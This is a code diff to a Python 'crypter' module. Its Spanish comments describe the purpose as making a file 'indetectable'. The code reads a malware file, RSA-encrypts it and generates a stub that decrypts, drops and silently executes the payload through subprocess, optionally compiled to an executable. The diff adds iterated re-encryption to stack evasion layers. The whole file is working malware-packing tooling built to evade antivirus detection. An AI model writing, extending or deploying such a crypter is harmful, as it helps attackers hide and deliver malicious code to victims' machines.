@@ -20,32 +20,36 @@ class StartModule():
 
 	def generate_keypair(self, prime_a, prime_b):
 		if not (self.__is_prime__(prime_a) and self.__is_prime__(prime_b)):
+			Logger.printMessage(message='{methodName}'.format(methodName='generate_keypair'), description=config['bad_identical_prime'], debug_module=True, is_error=True)
 			raise ValueError(config['bad_identical_prime'])
 		elif prime_a == prime_b:
+			Logger.printMessage(message='{methodName}'.format(methodName='generate_keypair'), description=config['p_q_equal_error'], debug_module=True, is_error=True)
 			raise ValueError(config['p_q_equal_error'])
-		#n = pq
-		n = prime_a * prime_b
+		else:
+			#n = pq
+			n = prime_a * prime_b
 
-		#Phi is the totient of n
-		phi = (prime_a-1) * (prime_b-1)
+			#Phi is the totient of n
+			phi = (prime_a-1) * (prime_b-1)
 
-		#Choose an integer e such that e and phi(n) are coprime
-		e = random.randrange(1, phi)
-
-		#Use Euclid's Algorithm to verify that e and phi(n) are comprime
-		g = self.__gcd__(e, phi)
-		while g != 1:
+			#Choose an integer e such that e and phi(n) are coprime
 			e = random.randrange(1, phi)
-			g = self.__gcd__(e, phi)
 
-		#Use Extended Euclid's Algorithm to generate the private key
-		d = self.__multiplicative_inverse__(e, phi)
-		
-		#Return public and private keypair
-		#Public key is (e, n) and private key is (d, n)
-		return ((e, n), (d, n))
+			#Use Euclid's Algorithm to verify that e and phi(n) are comprime
+			g = self.__gcd__(e, phi)
+			while g != 1:
+				e = random.randrange(1, phi)
+				g = self.__gcd__(e, phi)
+
+			#Use Extended Euclid's Algorithm to generate the private key
+			d = self.__multiplicative_inverse__(e, phi)
+			
+			#Return public and private keypair
+			#Public key is (e, n) and private key is (d, n)
+			return ((e, n), (d, n))
 
 	def getRandomKeypair(self):
+		Logger.printMessage(message='{methodName}'.format(methodName='getRandomKeypair'), debug_module=True)
 		prime_a = ''
 		prime_b = ''
 		while prime_a == prime_b:
@@ -60,6 +64,7 @@ class StartModule():
 		return (prime_a, prime_b)
 
 	def encrypt(self, private_key, plaintext):
+		Logger.printMessage(message='{methodName}'.format(methodName='encrypt'), description='{private_key} - {plaintext}'.format(private_key=private_key, plaintext=plaintext), debug_module=True)
 		#Unpack the key into it's components
 		key, n = private_key
 		mensaje = self.__mensajeASCII__(plaintext)
@@ -70,6 +75,7 @@ class StartModule():
 		return mensajeFinalBase64.decode("utf-8")
 
 	def decrypt(self, public_key, ciphertext):
+		Logger.printMessage(message='{methodName}'.format(methodName='decrypt'), description='{public_key} - {ciphertext}'.format(public_key=public_key, ciphertext=ciphertext), debug_module=True)
 		#Unpack the key into its components
 		key, n = public_key
 		mensajeRecibido = self.__recibirBase64__(ciphertext.encode('utf-8'))
@@ -79,19 +85,19 @@ class StartModule():
 		mensaje_de_ascii = self.__decimal_ASCII__(mensajeDescifrado)
 		return ''.join(mensaje_de_ascii)
 
-	'''
-	Euclid's algorithm for determining the greatest common divisor
-	Use iteration to make it faster for larger integers
-	'''
 	def __gcd__(self, a, b):
+		'''
+		Euclid's algorithm for determining the greatest common divisor
+		Use iteration to make it faster for larger integers
+		'''
 		while b != 0:
 			a, b = b, a % b
 		return a
 
-	'''
-	Euclid's extended algorithm for finding the multiplicative inverse of two numbers
-	'''
 	def __multiplicative_inverse__(self, e, phi):
+		'''
+		Euclid's extended algorithm for finding the multiplicative inverse of two numbers
+		'''
 		# See: http://en.wikipedia.org/wiki/Extended_Euclidean_algorithm
 		def eea(a,b):
 			if b==0:return (1,0)
@@ -102,10 +108,11 @@ class StartModule():
 		inv = eea(e,phi)[0]
 		if inv < 1: inv += phi #we only want positive values
 		return inv
-	'''
-	Tests to see if a number is prime.
-	'''
+	
 	def __is_prime__(self, num):
+		'''
+		Tests to see if a number is prime.
+		'''
 		if int(num) == 2:
 			return True
 		if int(num) < 2 or int(num) % 2 == 0:
@@ -168,17 +175,10 @@ class StartModule():
 	# FIN RSA
 
 	def getMalwareData(self, fileName):
-		print(fileName)
 		file = open(fileName, "rb")
 		file_data = file.read()
 		file.close()
 		return file_data
-
-	#def cryptData(data, cryptKey):
-	#   aes = pyaes.AESModeOfOperationCTR(cryptKey)
-	#    crypto_data = aes.encrypt(data)
-	#    crypto_data_hex = binascii.hexlify(crypto_data)
-	#    return crypto_data_hex
 
 	def convertToExe(self, stub_name):
 		# Convert py to exe with pyinstaller
@@ -213,15 +213,16 @@ class StartModule():
 		else:
 			return arg
 
-	def saveStub(self, stub, save_name):
+	def saveStub(self, stub, save_name, print_save_stub=True):
 		# Save the Stub
 		stub_name = save_name
 		stub_file = open(stub_name, "w")
 		stub_file.write(stub)
 		stub_file.close()
-		print('Stub saved as {file}'.format(file=stub_name))
+		if print_save_stub:
+			print('Stub saved as {file}'.format(file=stub_name))
 
-	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, convert=False):
+	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, print_save_stub=True, convert=False):
 		# Create Stub in Python File
 		stub = "import argparse\nimport math\nfrom random import randint\nimport base64\nimport binascii\nimport random\n"
 		stub += "crypto_data_hex = \"" + crypto_data_hex + "\"\n"
@@ -269,18 +270,25 @@ new_file.close()
 import subprocess
 proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 """
-		self.saveStub(stub, save_name)
+		self.saveStub(stub, save_name, print_save_stub)
 
 		if convert:
 			self.convertToExe(save_name)
 
-	def crypt_file(self, filename, new_file_name, drop_file_name, compile_exe=False):
+	def crypt_file(self, filename, new_file_name, drop_file_name, iterate_count=1, print_save_stub=True, compile_exe=False):
 		"""
 		filename es el archivo original a indetectar (filename='servidor.py')
 		new_file_name es el nombre final del fichero indetectado (new_file_name='indetectable.py')
 		drop_file_name es el nombre con el que se guarda trás ejecutarse el stub para poder ejecutarlo (drop_file_name='descifrado_ejecutable.py')
 		compile_exe es si queremos compilarlo con pyinstaller
 		"""
+		temp_filename = filename
+		if iterate_count > 1:
+			temp_filename = filename
+			for i in range(1, iterate_count):
+				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, iterate_count=1, print_save_stub=False, compile_exe=False)
+		
+		filename = temp_filename
 		if filename and new_file_name:
 			data = self.getMalwareData(filename)
 			prime_a, prime_b = self.getRandomKeypair()
@@ -290,10 +298,10 @@ proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), she
 			if not '.' in new_file:
 				new_file = '{file}.py'.format(file=new_file)
 			if compile_exe:
-				self.createStub(crypted_data, public, drop_file_name, new_file, True)
+				self.createStub(crypted_data, public, drop_file_name, new_file, print_save_stub, True)
 				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
 			else:
-				self.createStub(crypted_data, public, drop_file_name, new_file)
+				self.createStub(crypted_data, public, drop_file_name, new_file, print_save_stub)
 			return new_file
 		else:
 			return None
